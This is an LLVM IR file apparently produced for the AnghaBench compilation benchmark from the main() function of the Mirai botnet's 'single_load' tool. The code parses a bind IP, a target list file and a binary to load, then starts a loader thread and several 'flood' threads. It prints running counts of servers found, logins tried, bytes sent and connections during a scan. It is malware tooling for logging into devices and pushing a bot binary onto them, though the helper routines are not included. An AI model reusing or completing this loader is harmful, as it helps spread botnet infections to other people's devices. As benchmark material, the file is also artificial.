; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/tools/extr_single_load.c_main.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/tools/extr_single_load.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }
%struct.tm = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"Invalid parameters!\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [97 x i8] c"Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\0A\00", align 1
@SIGPIPE = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32* null, align 8
@epollFD = common dso_local global i32 0, align 4
@bind_ip = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@infd = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@sighandler = common dso_local global i32 0, align 4
@maxConnectedSockets = common dso_local global i8* null, align 8
@debug_mode = common dso_local global i32 0, align 4
@stateTable = common dso_local global %struct.TYPE_2__* null, align 8
@run_arg = common dso_local global i8* null, align 8
@loader = common dso_local global i32 0, align 4
@flood = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [21 x i8] c"%d %b %Y %l:%M %p %Z\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"Starting Scan at %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"Loaded\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"%-16s\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"State Timeout\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"No Connect\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"Closed Us\00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"Logins Tried\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"B/s\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"Connected\00", align 1
@.str.13 = private unnamed_addr constant [14 x i8] c"Running Thrds\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@running_threads = common dso_local global i64 0, align 8
@.str.16 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.17 = private unnamed_addr constant [10 x i8] c"%s|%-15lu\00", align 1
@found_srvs = common dso_local global i64 0, align 8
@timed_out = common dso_local global i64 0, align 8
@failed_connect = common dso_local global i64 0, align 8
@remote_hangup = common dso_local global i64 0, align 8
@login_done = common dso_local global i64 0, align 8
@.str.18 = private unnamed_addr constant [9 x i8] c"%s|%-15d\00", align 1
@bytes_sent = common dso_local global i32 0, align 4
@.str.19 = private unnamed_addr constant [21 x i8] c"Scan finished at %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [100 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca %struct.tm*, align 8
  %12 = alloca [17 x i8], align 16
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 4
  br i1 %15, label %16, label %25

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @stdout, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 -1) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* @SIGPIPE, align 4
  %27 = load i32*, i32** @SIG_IGN, align 8
  %28 = call i32 @signal(i32 %26, i32* %27)
  %29 = call i32 @epoll_create(i32 57005)
  store i32 %29, i32* @epollFD, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  store i8* %32, i8** @bind_ip, align 8
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @fopen(i8* %35, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32 %36, i32* @infd, align 4
  %37 = load i32, i32* @SIGINT, align 4
  %38 = call i32 @signal(i32 %37, i32* @sighandler)
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 5
  %41 = load i8*, i8** %40, align 8
  %42 = call i8* @atoi(i8* %41)
  %43 = ptrtoint i8* %42 to i32
  store i32 %43, i32* %6, align 4
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 6
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @atoi(i8* %46)
  store i8* %47, i8** @maxConnectedSockets, align 8
  %48 = load i32, i32* %4, align 4
  %49 = icmp eq i32 %48, 8
  br i1 %49, label %50, label %51

50:                                               ; preds = %25
  store i32 1, i32* @debug_mode, align 4
  br label %51

51:                                               ; preds = %50, %25
  store i32 0, i32* %7, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %7, align 4
  %54 = icmp slt i32 %53, 102400
  br i1 %54, label %55, label %65

55:                                               ; preds = %52
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** @stateTable, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %58
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 0
  %61 = call i32 @pthread_mutex_init(i32* %60, i32* null)
  br label %62

62:                                               ; preds = %55
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %7, align 4
  br label %52

65:                                               ; preds = %52
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 3
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @load_binary(i8* %68)
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 4
  %72 = load i8*, i8** %71, align 8
  store i8* %72, i8** @run_arg, align 8
  %73 = bitcast i32* %6 to i8*
  %74 = call i32 @pthread_create(i32* %8, i32* null, i32* @loader, i8* %73)
  store i32 0, i32* %7, align 4
  br label %75

75:                                               ; preds = %81, %65
  %76 = load i32, i32* %7, align 4
  %77 = load i32, i32* %6, align 4
  %78 = icmp slt i32 %76, %77
  br i1 %78, label %79, label %84

79:                                               ; preds = %75
  %80 = call i32 @pthread_create(i32* %8, i32* null, i32* @flood, i8* null)
  br label %81

81:                                               ; preds = %79
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %7, align 4
  br label %75

84:                                               ; preds = %75
  %85 = call i32 @time(i32* null)
  store i32 %85, i32* %10, align 4
  %86 = call %struct.tm* @localtime(i32* %10)
  store %struct.tm* %86, %struct.tm** %11, align 8
  %87 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %88 = load %struct.tm*, %struct.tm** %11, align 8
  %89 = call i32 @strftime(i8* %87, i32 99, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), %struct.tm* %88)
  %90 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %90)
  %92 = bitcast [17 x i8]* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %92, i8 0, i64 17, i1 false)
  %93 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %94 = call i32 @memset(i8* %93, i8 signext 0, i32 17)
  %95 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %96 = call i32 (i8*, i8*, ...) @sprintf(i8* %95, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %97 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %97)
  %99 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %100 = call i32 @memset(i8* %99, i8 signext 0, i32 17)
  %101 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %102 = call i32 (i8*, i8*, ...) @sprintf(i8* %101, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %103 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %103)
  %105 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %106 = call i32 @memset(i8* %105, i8 signext 0, i32 17)
  %107 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %108 = call i32 (i8*, i8*, ...) @sprintf(i8* %107, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0))
  %109 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %109)
  %111 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %112 = call i32 @memset(i8* %111, i8 signext 0, i32 17)
  %113 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %114 = call i32 (i8*, i8*, ...) @sprintf(i8* %113, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0))
  %115 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %115)
  %117 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %118 = call i32 @memset(i8* %117, i8 signext 0, i32 17)
  %119 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %119, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0))
  %121 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %121)
  %123 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %124 = call i32 @memset(i8* %123, i8 signext 0, i32 17)
  %125 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %126 = call i32 (i8*, i8*, ...) @sprintf(i8* %125, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %127 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %127)
  %129 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %130 = call i32 @memset(i8* %129, i8 signext 0, i32 17)
  %131 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %132 = call i32 (i8*, i8*, ...) @sprintf(i8* %131, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %133 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* %133)
  %135 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %136 = call i32 @memset(i8* %135, i8 signext 0, i32 17)
  %137 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %138 = call i32 (i8*, i8*, ...) @sprintf(i8* %137, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  %139 = getelementptr inbounds [17 x i8], [17 x i8]* %12, i64 0, i64 0
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %139)
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  %142 = call i32 @sleep(i32 1)
  %143 = call i64 @malloc(i32 96)
  %144 = inttoptr i64 %143 to i8*
  store i8* %144, i8** %13, align 8
  br label %145

145:                                              ; preds = %156, %84
  %146 = load i32, i32* @debug_mode, align 4
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %149

148:                                              ; preds = %145
  br label %153

149:                                              ; preds = %145
  %150 = load i64, i64* @running_threads, align 8
  %151 = icmp sgt i64 %150, 0
  %152 = zext i1 %151 to i32
  br label %153

153:                                              ; preds = %149, %148
  %154 = phi i32 [ 1, %148 ], [ %152, %149 ]
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %197

156:                                              ; preds = %153
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %158 = load i8*, i8** %13, align 8
  %159 = call i32 @memset(i8* %158, i8 signext 0, i32 96)
  %160 = load i8*, i8** %13, align 8
  %161 = load i8*, i8** %13, align 8
  %162 = load i64, i64* @found_srvs, align 8
  %163 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %161, i64 %162)
  %164 = load i8*, i8** %13, align 8
  %165 = load i8*, i8** %13, align 8
  %166 = load i64, i64* @timed_out, align 8
  %167 = call i32 (i8*, i8*, ...) @sprintf(i8* %164, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %165, i64 %166)
  %168 = load i8*, i8** %13, align 8
  %169 = load i8*, i8** %13, align 8
  %170 = load i64, i64* @failed_connect, align 8
  %171 = call i32 (i8*, i8*, ...) @sprintf(i8* %168, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %169, i64 %170)
  %172 = load i8*, i8** %13, align 8
  %173 = load i8*, i8** %13, align 8
  %174 = load i64, i64* @remote_hangup, align 8
  %175 = call i32 (i8*, i8*, ...) @sprintf(i8* %172, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %173, i64 %174)
  %176 = load i8*, i8** %13, align 8
  %177 = load i8*, i8** %13, align 8
  %178 = load i64, i64* @login_done, align 8
  %179 = call i32 (i8*, i8*, ...) @sprintf(i8* %176, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %177, i64 %178)
  %180 = load i8*, i8** %13, align 8
  %181 = load i8*, i8** %13, align 8
  %182 = load i32, i32* @bytes_sent, align 4
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* %180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0), i8* %181, i32 %182)
  %184 = load i8*, i8** %13, align 8
  %185 = load i8*, i8** %13, align 8
  %186 = call i64 (...) @getConnectedSockets()
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %184, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i64 0, i64 0), i8* %185, i64 %186)
  %188 = load i8*, i8** %13, align 8
  %189 = load i8*, i8** %13, align 8
  %190 = load i64, i64* @running_threads, align 8
  %191 = call i32 (i8*, i8*, ...) @sprintf(i8* %188, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0), i8* %189, i64 %190)
  %192 = load i8*, i8** %13, align 8
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %192)
  %194 = load i32, i32* @stdout, align 4
  %195 = call i32 @fflush(i32 %194)
  store i32 0, i32* @bytes_sent, align 4
  %196 = call i32 @sleep(i32 1)
  br label %145

197:                                              ; preds = %153
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  %199 = call i32 @time(i32* null)
  store i32 %199, i32* %10, align 4
  %200 = call %struct.tm* @localtime(i32* %10)
  store %struct.tm* %200, %struct.tm** %11, align 8
  %201 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %202 = load %struct.tm*, %struct.tm** %11, align 8
  %203 = call i32 @strftime(i8* %201, i32 99, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), %struct.tm* %202)
  %204 = getelementptr inbounds [100 x i8], [100 x i8]* %9, i64 0, i64 0
  %205 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0), i8* %204)
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @signal(i32, i32*) #1

declare dso_local i32 @epoll_create(i32) #1

declare dso_local i32 @fopen(i8*, i8*) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @pthread_mutex_init(i32*, i32*) #1

declare dso_local i32 @load_binary(i8*) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32*, i8*) #1

declare dso_local i32 @time(i32*) #1

declare dso_local %struct.tm* @localtime(i32*) #1

declare dso_local i32 @strftime(i8*, i32, i8*, %struct.tm*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i64 @getConnectedSockets(...) #1

declare dso_local i32 @fflush(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
